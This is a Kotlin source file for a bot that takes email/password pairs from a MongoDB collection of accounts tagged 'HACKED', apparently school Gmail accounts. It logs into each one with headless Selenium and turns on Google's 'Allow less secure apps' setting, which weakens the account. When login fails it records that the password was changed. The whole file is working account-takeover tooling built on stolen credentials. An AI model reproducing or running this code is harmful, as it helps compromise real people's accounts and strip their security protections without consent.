package net.scr0pt.bot.google

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import net.scr0pt.selenium.GoogleResponse
import net.scr0pt.thirdservice.mlab.loginGoogle
import net.scr0pt.thirdservice.mongodb.MongoConnection

import net.scr0pt.utils.webdriver.DriverManager
import org.bson.Document

/**
 * Created by Long
 * Date: 10/22/2019
 * Time: 10:24 PM
 */


 fun main() {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")

    while (true) {
        collection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))?.let {
            if (it.containsKey("Allow less secure apps")) return@let
            val gmailUsername = it.getString("email")
            val recover_email: String? = it.getString("recover_email")
            val gmailPassword = it.getString("new_pass") ?: it.getString("pass")

            val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox, driverHeadless = true)
            loginGoogle(gmailUsername, gmailPassword, driverManager, onLoginSuccess = { allowLessSecureApps(driverManager, gmailUsername, collection) },
                    onLoginFail = { response ->
                        println(6)
                        if (response is GoogleResponse.PASSWORD_CHANGED || response is GoogleResponse.INCORECT_PASSWORD) {
                            println(7)
                            collection.updateOne(Document("email", gmailUsername), Updates.combine(
                                    Updates.set("login_status", "PASSWORD_CHANGED"),
                                    Updates.set("email_status", null)
                            ))
                        } else {
                            println(8)
                            print(response)
                        }
                    }, recoverEmail = recover_email)
            println(9)
            Thread.sleep(5000)
        }
    }
}

fun allowLessSecureApps(driver: DriverManager, gmailUsername: String, collection: MongoCollection<Document>) {
    println(1)
    driver.get("https://myaccount.google.com/lesssecureapps?utm_source=google-account&utm_medium=web")
    var accessTxt = driver.findFirstEl("div", startWithsOneOf = listOf("Allow less secure apps: ","Cho phép ứng dụng kém an toàn: ") )?.text
            ?: return
    println(1.5)
    if (accessTxt == "Allow less secure apps: ON" || accessTxt == "Cho phép ứng dụng kém an toàn: BẬT") {
        println(2)
        onSuccess(gmailUsername, collection, driver)
    } else if (accessTxt == "Allow less secure apps: OFF" || accessTxt == "Cho phép ứng dụng kém an toàn: TẮT") {
        println(3)
        driver.findFirstEl(".LsSwGf")?.click()
        Thread.sleep(2000)
        driver.refresh()
        Thread.sleep(2000)

        accessTxt = driver.findFirstEl("div", startWithsOneOf = listOf("Allow less secure apps: ","Cho phép ứng dụng kém an toàn: ") )?.text ?: return
        println(4)
        if (accessTxt == "Allow less secure apps: ON" || accessTxt == "Cho phép ứng dụng kém an toàn: BẬT") {
            println(5)
            onSuccess(gmailUsername, collection, driver)
        }
    }
}

fun onSuccess(gmailUsername: String, collection: MongoCollection<Document>, driver: DriverManager) {
    println("Allow less secure apps true")
    collection.updateOne(Document("email", gmailUsername), Updates.set("Allow less secure apps", true))
    driver.close()
}
